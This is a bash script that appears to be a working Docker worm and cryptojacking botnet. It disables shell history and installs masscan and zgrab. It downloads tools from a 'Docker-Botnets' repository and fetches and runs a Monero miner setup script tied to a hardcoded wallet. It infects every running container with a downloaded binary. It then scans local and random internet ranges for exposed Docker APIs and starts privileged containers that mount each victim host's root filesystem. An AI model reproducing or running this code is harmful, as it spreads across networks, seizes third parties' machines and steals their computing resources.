#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

RATESCAN="50000"
SETUP_SLEEP="1"

function INIT_MAIN(){
    SETUP_BASICS
    SETUP_SYSTEM
    SETUP_JQ
    SETUP_ZMAP
    SETUP_TOOLS
    SETUP_MSCAN
    SETUP_XMR
    INFECT_ALL_CONTAINERS
    GETLOCALRANGES
    AUTOLANDOCKERPWN
    LANDOCKERPWN
    RANDOMDOCKERPWN

}

function SETUP_BASICS() {
    # Update package index
    apk update
    apk add --no-cache \
        go \
        git \
        jq \
        openrc \
        masscan \
        libpcap \
        libpcap-dev \
        docker \
        make \
        cmake \
        upx \
        libstdc++ \
        gcc \
        g++ \
        libuv-dev \
        iptables \
        openssl \
        openssl-dev \
        hwloc-dev \
        gmp-dev \
        gengetopt \
        flex \
        byacc \
        json-c-dev \
        libunistring-dev \
        judy-dev \
        upx-ucl \
        bash \
        build-base \
        7zip \
        screen \
        curl \
        wget \
        vim
}

function SETUP_SYSTEM(){
    apk update || { echo "APK update failed"; exit 1; }
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
}

function SETUP_TOOLS(){
if ! [ -d "/dev/shim/.../...nmlm.../" ] ; then mkdir -p /dev/shim/.../...nmlm.../ ; fi
if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi
fi
if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/zgrab ; chmod +x /usr/sbin/zgrab ; fi
if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/jq ; chmod +x /usr/sbin/jq ; fi
if ! type masscan 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
fi
}


function SETUP_MSCAN(){
    apk update
    apk add git gcc make musl-dev libpcap-dev linux-headers masscan
}

function SETUP_XMR(){
bash /root/setup_xmrig.sh
}

function INFECT_ALL_CONTAINERS(){
    docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER > /tmp/.dc
    for i in $(cat /tmp/.dc); do
        docker exec --privileged -d "$i" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
    done
    export HOME=/root
    nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9) &
}

function GETLOCALRANGES(){
    ip route show | awk '{print $1}' | grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
    TARGETRANGE=$1
    TARGETPORT=$2
    SCANRATE=$3
    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
    eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}' | zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'"

    for TARGETIP in ${!rndstr}; do
        echo "$TARGETIP:$TARGETPORT"
        timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host nmlmweb3/alpine_upspin:latest
    done
}

function LANDOCKERPWN(){
    GETLOCALRANGES
    while read -r TargetRange; do
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
    done < /tmp/.lr
    rm -f /tmp/.lr
}

function RANDOMDOCKERPWN(){
    for (( ; ; )); do
        TargetRange="$[RANDOM%255+1].0.0.0/8"
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
        sleep 1
    done
}

INIT_MAIN
